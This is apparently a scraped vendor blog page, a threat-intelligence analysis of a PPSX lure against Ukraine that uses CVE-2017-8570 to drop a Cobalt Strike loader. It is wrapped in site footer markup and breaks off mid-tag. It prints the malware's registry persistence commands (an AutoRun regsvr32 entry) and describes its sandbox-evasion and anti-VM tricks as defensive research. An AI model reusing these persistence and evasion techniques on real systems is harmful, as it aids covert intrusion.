272 191.57a43.64 43.64 0 0 1-3.82-10.57ZM159.48 235.52V1.8h-39.42v75.39H82.93c-15.91 0-28.79 1.89-38.26 5.68a58.32 58.32 0 0 0-24.62 18.56 73.06 73.06 0 0 0-12.88 23.86A99.76 99.76 0 0 0 3 154.08c0 25.38 6.82 45.84 20.45 59.85q20.46 21.6 56.82 21.59h79.21Zm-39.81-32.19H90.12c-16.28 0-27.65-3.4-34.47-10.23s-10.23-18.56-10.23-34.85c0-16.67 3.79-29.17 11-36.37s19.71-11 37.13-11h26.14Z" fill="currentColor" transform="translate(-3 -1.8)"></path></svg></a></div><div class="grid grid-cols-2 md:grid-cols-3 gap-4 lg:col-span-3 2xl:col-span-4 2xl:grid-cols-4"><div class="footer__menu"><div class="mb-5"><h3 class="text-sm uppercase font-sans tracking-widest font-bold mb-4"><span class="Footer_footer__border-bottom__2dwEv">Products</span></h3><ul><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Prevention Platform" href="/platform">Prevention Platform</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Prevention for Storage" href="/prevention-for-storage">Prevention for Storage</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Prevention for Applications" href="/prevention-for-applications">Prevention for Applications</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Prevention for Endpoints" href="/endpoint-security">Prevention for Endpoints</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="DIANNA - AI Cyber Companion" href="/dianna-ai-cyber-companion">DIANNA - AI Cyber Companion</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Data Security: Powered by Deep Instinct" href="/data-security">Data Security: Powered by Deep Instinct</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Deep Learning: Prevention-First Cybersecurity" href="/why-deep-instinct">Deep Learning: Prevention-First Cybersecurity</a></li></ul></div></div><div class="footer__menu"><div class="mb-5"><h3 class="text-sm uppercase font-sans tracking-widest font-bold mb-4"><span class="Footer_footer__border-bottom__2dwEv">Why Deep Instinct</span></h3><ul><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="&gt;99% Threat Accuracy" href="/endpoint-protection-platforms">&gt;99% Threat Accuracy</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Prevent Ransomware" href="/ransomware-protection-solution">Prevent Ransomware</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Prevent Zero-Day Attacks" href="/zero-day-attacks">Prevent Zero-Day Attacks</a></li></ul></div></div><div class="footer__menu"><div class="mb-5"><h3 class="text-sm uppercase font-sans tracking-widest font-bold mb-4"><span class="Footer_footer__border-bottom__2dwEv">Enhance Existing Cyber Tools</span></h3><ul><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Extend &amp; Enhance EDR/XDR" href="/endpoint-detection-response">Extend &amp; Enhance EDR/XDR</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="+ Microsoft Defender" href="/vs-microsoft-defender">+ Microsoft Defender</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="+ Tanium" href="/deep-instinct-tanium">+ Tanium</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Legacy AV" href="/deep-instinct-vs-competitors">Legacy AV</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Replace Trellix" href="/deep-instinct-versus-trellix">Replace Trellix</a></li></ul></div></div><div class="footer__menu"><div class="mb-5"><h3 class="text-sm uppercase font-sans tracking-widest font-bold mb-4"><span class="Footer_footer__border-bottom__2dwEv">Company</span></h3><ul><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="About Deep Instinct" href="/about-us">About Deep Instinct</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Our Customers" href="/customers">Our Customers</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Newsroom" href="/newsroom">Newsroom</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Careers" href="/careers">Careers</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Contact Us" href="/contact-us">Contact Us</a></li></ul></div></div><div class="footer__menu"><div class="mb-5"><h3 class="text-sm uppercase font-sans tracking-widest font-bold mb-4"><span class="Footer_footer__border-bottom__2dwEv">Resources</span></h3><ul><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Asset Library" href="/resources">Asset Library</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Blog" href="/blog">Blog</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Videos" href="/videos">Videos</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Events &amp; Webinars" href="/events-webinars">Events &amp; Webinars</a></li></ul></div></div><div class="footer__menu"><div class="mb-5"><h3 class="text-sm uppercase font-sans tracking-widest font-bold mb-4"><span class="Footer_footer__border-bottom__2dwEv">Quick links</span></h3><ul><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Request Demo" target="_blank" rel="noopener" href="https://info.deepinstinct.com/request-a-demo">Request Demo</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Customer Portal" target="_blank" rel="noopener" href="https://portal.deepinstinct.com/">Customer Portal</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Integrations and Compliance" href="/compliance-certification-evaluation">Integrations and Compliance</a></li><li><a class="text-sm tracking-wide Footer_footer__border-bottom__2dwEv" aria-label="Training" href="/deep-instinct-training">Training</a></li></ul></div></div></div></div></div><div class="footer__bottom border-t border-grey py-2 pt-9 grid grid-cols-1 md:grid-cols-5 xl:grid-cols-4"><div class="footer__copyright order-3 md:col-span-2 md:order-2 xl:col-span-1 xl:order-1 flex items-center"><p class="font-medium text-h-xs tracking-wide-sm">© <!-- -->2024<!-- --> Deep Instinct. All rights reserved.</p></div><div class="footer__more text-left col-span-1 order-2 py-4 md:py-0 md:col-span-3 md:text-right md:order-3 xl:order-2 xl:text-center xl:col-span-2"><ul><li class="block px-0 md:inline-block md:px-5 "><a class="text-sm tracking-wide-sm font-medium Footer_footer__border-bottom__2dwEv" aria-label="Privacy Policy" href="/privacy-policy">Privacy Policy</a></li><li class="block px-0 md:inline-block md:px-5 "><a class="text-sm tracking-wide-sm font-medium Footer_footer__border-bottom__2dwEv" aria-label="Candidate Privacy Policy" href="/candidate-privacy-policy">Candidate Privacy Policy</a></li><li class="block px-0 md:inline-block md:px-5 "><a class="text-sm tracking-wide-sm font-medium Footer_footer__border-bottom__2dwEv" aria-label="Cookie Policy" href="/cookies-policy">Cookie Policy</a></li><li class="block px-0 md:inline-block md:px-5 md:pr-0 xl:pr-5"><a class="text-sm tracking-wide-sm font-medium Footer_footer__border-bottom__2dwEv" aria-label="Terms of use" href="/terms-of-use">Terms of use</a></li></ul></div><div class="footer__social text-center order-1 md:col-span-5 md:order-1 md:mb-4 xl:mb-0 xl:order-3 xl:text-right xl:col-span-1"><ul class="flex justify-center xl:justify-end"><li class="flex items-center h-6"><a href="https://www.youtube.com/channel/UCYerfisJf3hc9QOWmic1G9Q" aria-label="Find us on youtube" class="inline-block px-3 hover:opacity-80 " target="_blank" rel="noopener"><svg fill="currentColor" width="36" height="36" viewBox="0 0 36 36" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M25.1528 2.27992L25.1528 2.27995L25.1654 2.28091C26.2554 2.36361 26.9066 2.5722 27.3166 2.81315C27.6834 3.02865 27.9742 3.33705 28.2219 3.89044C28.4913 4.49225 28.7004 5.36816 28.8303 6.66641C28.9592 7.95408 29 9.536 29 11.4973C29 13.4583 28.9592 15.049 28.8302 16.3475C28.7 17.6573 28.4903 18.5468 28.2192 19.158C27.9692 19.7216 27.6795 20.0247 27.3266 20.2293C26.9315 20.4585 26.295 20.6559 25.2156 20.7105L25.2072 20.711C20.6373 20.9614 10.4021 20.9617 5.8144 20.7121C4.73649 20.6284 4.09086 20.4209 3.68337 20.1814C3.31663 19.9659 3.02578 19.6575 2.77809 19.1042C2.50873 18.5023 2.29962 17.6264 2.16968 16.3282C2.0408 15.0405 2 13.4586 2 11.4973C2 9.536 2.0408 7.95408 2.16968 6.66641C2.29962 5.36816 2.50873 4.49225 2.77809 3.89044C3.02578 3.33705 3.31663 3.02865 3.68337 2.81315C4.09341 2.5722 4.74456 2.36361 5.83463 2.28091L5.83464 2.28094L5.84716 2.27992C10.3881 1.9067 20.6119 1.9067 25.1528 2.27992ZM0 11.4973C0 19.3957 0.645833 22.3258 5.68333 22.708C10.3333 22.9627 20.6667 22.9627 25.3167 22.708C30.3542 22.4532 31 19.3957 31 11.4973C31 3.59888 30.3542 0.668818 25.3167 0.286636C20.6667 -0.0955454 10.3333 -0.0955454 5.68333 0.286636C0.645833 0.668818 0 3.59888 0 11.4973ZM12.4123 16.2863C11.7503 16.5859 11 16.1018 11 15.3753V8.52019C11 7.79363 11.7503 7.30959 12.4123 7.60913L19.9867 11.0367C20.7703 11.3913 20.7703 12.5042 19.9867 12.8588L12.4123 16.2863Z" fill="currentColor"></path></svg></a></li><li class="flex items-center h-6"><a href="https://www.linkedin.com/company/deep-instinct" aria-label="Find us on linkedin" class="inline-block px-3 hover:opacity-80 " target="_blank" rel="noopener"><svg fill="currentColor" width="36" height="36" viewBox="0 0 36 36" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M4.58333 2.3913C4.58333 3.73043 3.575 4.78261 2.29167 4.78261C1.00833 4.78261 0 3.73043 0 2.3913C0 1.05217 1.00833 0 2.29167 0C3.575 0 4.58333 1.05217 4.58333 2.3913ZM4.58333 6.69565H0V22H4.58333V6.69565ZM11.9167 6.69565H7.33333V22H11.9167V13.9652C11.9167 9.46957 17.4167 9.08696 17.4167 13.9652V22H22V12.3391C22 4.78261 13.8417 5.06956 11.9167 8.8V6.69565Z" fill="currentColor"></path></svg></a></li><li class="flex items-center h-6"><a href="https://twitter.com/DeepInstinctSec" aria-label="Find us on twitter" class="inline-block px-3 hover:opacity-80 " target="_blank" rel="noopener"><svg fill="currentColor" width="36" height="36" viewBox="0 0 36 36" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M7.23329 19C15.9129 19 20.6595 11.6908 20.6595 5.35298C20.6595 5.14532 20.6553 4.93872 20.6459 4.73292C21.5673 4.05595 22.3683 3.21094 23 2.24946C22.1545 2.63129 21.2447 2.88841 20.2902 3.00434C21.2643 2.4106 22.0125 1.47093 22.3654 0.35098C21.4535 0.900584 20.4437 1.29996 19.3691 1.51533C18.5077 0.583106 17.2813 0 15.9244 0C13.3182 0 11.2048 2.14816 11.2048 4.79593C11.2048 5.17244 11.2464 5.53831 11.327 5.88956C7.40542 5.68934 3.92781 3.78048 1.60068 0.878514C1.19495 1.58712 0.961353 2.41086 0.961353 3.28911C0.961353 4.95308 1.79452 6.42214 3.06142 7.28178C2.28736 7.25758 1.56014 7.04114 0.924206 6.68165C0.92316 6.7016 0.92316 6.7218 0.92316 6.74281C0.92316 9.06593 2.55 11.0054 4.70893 11.4449C4.31261 11.5547 3.89564 11.6137 3.46505 11.6137C3.16108 11.6137 2.86548 11.5829 2.57799 11.5273C3.17861 13.4327 4.92082 14.8196 6.98635 14.8587C5.37102 16.1454 3.33635 16.9119 1.12563 16.9119C0.745015 16.9119 0.369369 16.8899 0 16.8455C2.08829 18.2058 4.56793 19 7.23329 19Z" fill="currentColor"></path></svg></a></li><li class="flex items-center h-6"><a href="https://www.facebook.com/DeepInstinctInc" aria-label="Find us on facebook" class="inline-block px-3 hover:opacity-80 xl:pr-0" target="_blank" rel="noopener"><svg fill="currentColor" width="36" height="36" viewBox="0 0 36 36" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M3.25 8.66667H0V13H3.25V26H8.66667V13H12.5667L13 8.66667H8.66667V6.825C8.66667 5.85 8.88333 5.41667 9.85833 5.41667H13V0H8.88333C4.98333 0 3.25 1.73333 3.25 4.98333V8.66667Z" fill="currentColor"></path></svg></a></li></ul></div></div></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"blockPost":{"uid":"blt646844b5f67b443c","_version":25,"locale":"en-us","ACL":{},"_in_progress":false,"author":[{"_content_type_uid":"di_author","uid":"blt0d06596feda8ed36","title":"Ivan Kosarev","url":"/ivan-kosarev","image":{"uid":"blt0cf06d1687eae8f6","_version":1,"parent_uid":"blt9a4786940a2a3a18","created_by":"bltdc505b576b8af7b9","updated_by":"bltdc505b576b8af7b9","created_at":"2024-04-25T13:18:48.519Z","updated_at":"2024-04-25T13:18:48.519Z","content_type":"image/png","file_size":"402746","filename":"Ivan_Kosarev.png","title":"Ivan_Kosarev.png","ACL":{},"is_dir":false,"tags":[],"publish_details":{"time":"2024-04-25T14:13:40.594Z","user":"bltdc505b576b8af7b9","environment":"blt1b1ee2a5b0429c28","locale":"en-us"},"url":"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt0cf06d1687eae8f6/662a583851b16fd55bc4f095/Ivan_Kosarev.png"},"author_title":"Threat Intelligence Researcher","bio":"","social_links":[],"tags":[],"locale":"en-us","created_by":"bltdc505b576b8af7b9","updated_by":"bltdc505b576b8af7b9","created_at":"2024-04-25T13:20:26.435Z","updated_at":"2024-04-25T13:20:26.435Z","ACL":{},"_version":1,"_in_progress":false,"publish_details":{"time":"2024-04-25T14:13:40.530Z","user":"bltdc505b576b8af7b9","environment":"blt1b1ee2a5b0429c28","locale":"en-us"}},{"_content_type_uid":"di_author","_version":4,"locale":"en-us","uid":"bltf2f2c4ed0c1268e0","ACL":{},"_in_progress":false,"author_title":"","bio":"","created_at":"2021-09-14T09:13:32.660Z","created_by":"blt1d5768f5c3f56b45","image":{"parent_uid":"blt9a4786940a2a3a18","uid":"bltfdfca743f7ac9662","created_by":"blt0d598b36a82e8d10","updated_by":"blt0d598b36a82e8d10","created_at":"2022-08-30T15:03:33.619Z","updated_at":"2022-08-30T15:31:41.534Z","content_type":"image/png","file_size":"6122","filename":"800x800-blue-monogram.png","title":"800x800-blue-monogram.png","ACL":{},"_version":4,"is_dir":false,"tags":[],"description":"","publish_details":{"environment":"blt1b1ee2a5b0429c28","locale":"en-us","time":"2022-08-30T15:33:02.498Z","user":"blt0d598b36a82e8d10"},"url":"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltfdfca743f7ac9662/630e2d5d8bdc107d4a01ba3f/800x800-blue-monogram.png"},"social_links":[],"tags":[],"title":"Deep Instinct Threat Lab","updated_at":"2022-08-30T15:32:56.174Z","updated_by":"blt0d598b36a82e8d10","url":"/deep-instinct-research","publish_details":{"environment":"blt1b1ee2a5b0429c28","locale":"en-us","time":"2022-08-30T15:33:02.549Z","user":"blt0d598b36a82e8d10"}}],"created_at":"2024-04-24T21:03:07.179Z","created_by":"bltdc505b576b8af7b9","description":"","di_tags":[],"image":{"src":"https://www.deepinstinct.com/image/blt61c3dfc7363deead/6629802381c884594a38061c/ThreatResearchTeam_Blog_1200x627_C.png","alt":"","title":"","meta":{"type":"image","uid":"blt61c3dfc7363deead","locale":"en-us"},"width":1200,"height":627},"modular_blocks":[{"richtext_block":{"rich_text_editor":"\u003ch5\u003eExecutive Summary\u003c/h5\u003e\u003cul\u003e\u003cli\u003eThe Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine\u003c/li\u003e\u003cli\u003eThe operation is using CVE-2017-8570 as the initial vector\u003c/li\u003e\u003cli\u003eThe operation could not be attributed to any known threat actor\u003c/li\u003e\u003cli\u003eThe operation used a custom loader for Cobalt Strike Beacon\u003c/li\u003e\u003cli\u003eDeep Instinct is detecting all stages of the attack\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ch5\u003eCampaign Overview\u003c/h5\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltc1c7893c1561616d\" alt=\"fig1-campaign-attack-flow.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc1c7893c1561616d/662980cc81c884147c380620/fig1-campaign-attack-flow.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 1: Campaign overview\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eDeep Instinct Threat Lab observed a malicious PPSX file uploaded from Ukraine to VirusTotal at the end of 2023:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt9b1f379f0880a620\" alt=\"fig2_vt_upload.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt9b1f379f0880a620/662980cbb0ec774e92d6ebe3/fig2_vt_upload.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 2: VT upload information\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe file name suggests that it was shared via the Signal application; however, this doesn’t necessarily mean the file was initially sent to the victim via the application.\u003c/p\u003e\u003cp\u003eThe PPSX (PowerPoint Slideshow) file appears to be an old instruction manual of the US Army for mine clearing blades (MCB) for tanks.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt8076071cddf4d2cb\" alt=\"fig3_ppsx_image.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt8076071cddf4d2cb/662980cc4da2a96906ff3317/fig3_ppsx_image.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 3: PPSX content\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe PPSX file includes a remote relationship to an external OLE object:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltdd378bc3103691ce\" alt=\"fig4_remote_relationship.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltdd378bc3103691ce/662980cbca88748093ed46c4/fig4_remote_relationship.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 4: Remote relationship\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe use of the “script:” prefix before the https URL indicates the use of \u003ca href=\"https://justhaifei1.blogspot.com/2017/07/bypassing-microsofts-cve-2017-0199-patch.html\"\u003eCVE-2017-8570,\u003c/a\u003e which is a bypass to the more known \u003ca href=\"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0199\"\u003eCVE-2017-0199\u003c/a\u003e.\u003c/p\u003e\u003cp\u003eThe remote script, which is named \"widget_iframe.617766616773726468746672726a6834.html,” was hosted at the domain “weavesilk[.]space,” which is protected by CloudFlare. However, during our analysis, we managed to identify the real hosting behind the domain, which is a Russian VPS provider:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltc6124aad899ad56e\" alt=\"fig5_real_ip.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc6124aad899ad56e/662980cbb05441820e9a07a0/fig5_real_ip.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 5: Real domain IP\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe contents of the scriptlet are highly obfuscated:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt2b37b1576b008675\" alt=\"fig6_scriplet.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt2b37b1576b008675/662980e145f98904f0cf6ed8/fig6_scriplet.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 6: Obfuscated scriplet content\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eAfter de-obfuscation:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltac52ea4fac4551d6\" alt=\"fig7-scriptlet_de-obfuscated.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltac52ea4fac4551d6/662980dc528fc18f0455be1d/fig7-scriptlet_de-obfuscated.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 7: Scriplet deobfuscated\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe second stage dropper is an HTML file containing JavaScript code that would get executed via Windows \u003cstrong\u003ecscript.exe\u003c/strong\u003e\u003c/p\u003e\u003cp\u003eIt’s responsible for persistency, decoding, and saving the embedded payload to disk.\u003c/p\u003e\u003ch5\u003eKey Points\u003c/h5\u003e\u003cul\u003e\u003cli\u003eDrops the payload disguised as Cisco AnyConnect VPN file under the path:\u003cul\u003e\u003cli\u003eC:\\Users\\\u0026lt;Username\u0026gt;\\AppData\\Roaming\\Cisco\\AnyConnect\\vpn.sessings\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003cli\u003eGains persistence by modifying these registry keys:\u003cul\u003e\u003cli\u003e\u003cstrong\u003eHKCU\\Software\\Microsoft\\Command Processor\\AutoRun: start regsvr32 /s C:\\\u0026lt;path\u0026gt;\\vpn.sessings -\u003c/strong\u003e This would execute the malware every time cmd.exe gets executed.\u003c/li\u003e\u003cli\u003e\u003cstrong\u003eHKCU\\Software\\Microsoft\\Windows\\CurrentVirsion\\Run: cmd /Q /C whoami - \u003c/strong\u003eThis is actual persistence. It achieves this by executing \u003cstrong\u003ewhoami\u003c/strong\u003e, which triggers the loader every time the system starts.\u003c/li\u003e\u003c/ul\u003e\u003c/li\u003e\u003c/ul\u003e\u003cp\u003eThis persistence technique is unusual and could cause the payload to be executed multiple times unnecessarily, though because it looks benign, the persistence would be harder to spot by incident response and could also cause a privilege escalation if a high-privilege user or process executes cmd.exe.\u003c/p\u003e\u003ch5\u003eDLL Payload Analysis\u003c/h5\u003e\u003cp\u003eThe sample includes a loader/packer Dynamic Link Library (DLL) named \u003cstrong\u003evpn.sessings\u003c/strong\u003e that loads a Cobalt Strike Beacon into memory and awaits instructions from the C\u0026amp;C server\u003c/p\u003e\u003cp\u003eCobalt Strike was already \u003ca href=\"https://www.deepinstinct.com/blog/cobalt-strike-post-exploitation-attackers-toolkit\"\u003eanalyzed\u003c/a\u003e many times, so we won’t go into detail, but the loader contained a couple of interesting behaviors.\u003c/p\u003e\u003ch6\u003eLoader Analysis\u003c/h6\u003e\u003cp\u003eThe sample is a DLL that executes using Regsvr32.\u003c/p\u003e\u003cp\u003eMost of the important logic is inside \u003cstrong\u003eDllRegisterServer\u003c/strong\u003e.\u003c/p\u003e\u003cp\u003eThe exported methods strangely have names of undocumented low-level WinAPI calls (Nt, Zw, Rt), but most were empty and unused.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt4709165469601da7\" alt=\"fig8-loader_export_table.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/blt4709165469601da7/662980dc81c8846696380625/fig8-loader_export_table.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 8: Loader export table\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eThe loader attempts to terminate the parent process (anti-debugging), iterating over running processes and looking for itself. Then, it attempts to terminate its parent process:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltc424f7c746d42655\" alt=\"fig9-terminate_parent.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc424f7c746d42655/662980dc58ce883b0fc30d69/fig9-terminate_parent.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 9: Terminate parent\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003eWhen it is executed from the “Command Processor” registry key, it runs under a “\u003cstrong\u003eNon-Existent Process\u003c/strong\u003e,” meaning there is no parent process it could terminate. However, while debugging, it terminates together with the debugger, slowing analysis – and annoys the researcher!\u003c/p\u003e\u003cimg asset_uid=\"bltc9bae58f8841bd48\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltc9bae58f8841bd48/66298108ac4b002087c435ca/figX-annoyed-researcher.png\" alt=\"figX-annoyed-researcher.png\" height=\"auto\"/\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003e\u003cem\u003eStalling Execution (Possible Sandbox Evasion)\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe loader dynamically loads the low-level \u003cstrong\u003eNtDelayExecution \u003c/strong\u003eWinAPI Call, and stalls for 20 seconds without any clear functional reason.\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"bltb582b8be7f4ba7c2\" alt=\"fig10-delay_execution.jse.png\" src=\"https://images.contentstack.io/v3/assets/blt1ec077b6b53d6b3e/bltb582b8be7f4ba7c2/662980dc776d0c5c3124e7d3/fig10-delay_execution.jse.png\" height=\"auto\" style=\"text-align: center;\" /\u003e\u003cfigcaption  style=\"text-align: center;\" style=\"text-align: center;\"\u003eFigure 10: Delay execution\u003c/figcaption\u003e\u003c/div\u003e\u003c/figure\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003ePossible explanations could be to either slow debugging or evade sandboxes.\u003c/p\u003e\u003cp\u003eIt may exploit the fact that preventive sandbox emulations need to deal with large volumes of malware and can only last for short periods of time (2-5 min).\u003c/p\u003e\u003cp\u003eMost solutions skip long sleeps/delays, but here it was executed 20 times, \u0026shy;each for a second, possibly trying to bypass automatic skips while also delaying the execution slightly.\u003c/p\u003e\u003cp\u003eOne-second delays look like a short amount, but because these calls are usually hooked for monitoring, each call takes longer and could exclude important indicators from emulation windows.\u003c/p\u003e\u003ch6\u003e\u003cem\u003eCheck \u003c/em\u003e\u003cem\u003e\u003cstrong\u003eCPUID\u003c/strong\u003e\u003c/em\u003e\u003cem\u003e (Anti-VM)\u003c/em\u003e\u003c/h6\u003e\u003cp\u003eThe loader executes \u003cstrong\u003eCPUID\u003c/strong\u003e using an inline ASM instruction to determine whether the malware is being executed in a virtual machine.\u003c/p\u003e\u003cp\u003eThe \u003cstrong\u003eCPUID \u003c/strong\u003ex86 instruction returns a \u003cstrong\u003enegative \u003c/strong\u003evalue if executed in a \u003cstrong\u003eVM \u003c/strong\u003e(the 2^31 bit is set to 1; \u003cstrong\u003esigned\u003c/strong\u003e values over \u003cem\u003e0x80000000\u003c/em\u003e are negative).\u003c/p\u003e\u003cp\u003eWe can see in the instruction below that it would return true if \u003cstrong\u003eCPUID \u003c/strong\u003ereturns a positive number:\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cfigure style=\"text-align: center\"\u003e\u003cdiv data-img-caption-container=\"true\" style=\"display: inline-block; text-align: center;\"\u003e\u003cimg asset_uid=\"blt52ebfe0b956dc5cf\" alt=\"fig11-check_vm.jse.png\" 